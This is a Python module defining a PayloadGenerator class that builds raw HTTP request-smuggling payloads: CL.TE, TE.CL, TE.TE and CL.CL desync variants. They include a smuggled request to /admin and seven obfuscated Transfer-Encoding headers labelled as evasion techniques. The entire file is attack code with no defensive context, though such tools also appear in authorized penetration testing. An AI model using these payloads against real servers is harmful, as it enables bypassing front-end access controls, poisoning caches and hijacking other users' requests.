"""Advanced payload generation utilities."""

from __future__ import annotations

from typing import List, Tuple


class PayloadGenerator:
    """Advanced payload generation with evasion techniques."""

    @staticmethod
    def cl_te_basic(host: str, path: str = "/") -> str:
        return (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Content-Length: 6\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "0\r\n\r\nG"
        )

    @staticmethod
    def cl_te_with_body(host: str, path: str = "/") -> str:
        """CL.TE with actual body content to trigger backend processing."""
        smuggled = "GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n"
        return (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: {len(smuggled)}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "0\r\n\r\n"
            f"{smuggled}"
        )

    @staticmethod
    def cl_te_timeout(host: str, path: str = "/", delay: int = 10) -> str:
        return (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: {13 + delay}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "0\r\n\r\n"
            f"X{'a' * delay}"
        )

    @staticmethod
    def te_cl_confirm(host: str, path: str = "/") -> str:
        smuggled_prefix = (
            "GPOST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Content-Length: 10\r\n\r\n"
            "x="
        )
        return (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Content-Length: 4\r\n"
            "Transfer-Encoding: chunked\r\n\r\n"
            f"{len(smuggled_prefix):x}\r\n"
            f"{smuggled_prefix}\r\n"
            "0\r\n\r\n"
        )

    @staticmethod
    def te_te_variants(host: str, path: str = "/") -> List[Tuple[str, str]]:
        variants: List[Tuple[str, str]] = []
        obfuscations = [
            ("Double TE", "Transfer-Encoding: chunked\r\nTransfer-Encoding: x"),
            ("Case Mix", "Transfer-Encoding: chunked\r\nTransfer-encoding: x"),
            ("Space Before", "Transfer-Encoding : chunked"),
            ("Space After", "Transfer-Encoding: chunked "),
            ("Tab Separator", "Transfer-Encoding:\tchunked"),
            ("Wrapped Value", "Transfer-Encoding: chunked\r\n cow"),
            ("Identity", "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity"),
        ]

        for name, te_header in obfuscations:
            payload = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"{te_header}\r\n\r\n"
                "0\r\n\r\n"
            )
            variants.append((name, payload))

        return variants

    @staticmethod
    def cl_cl_desync(host: str, path: str = "/") -> str:
        return (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Content-Length: 6\r\n"
            "Content-Length: 0\r\n\r\n"
            "SMUGGLED"
        )
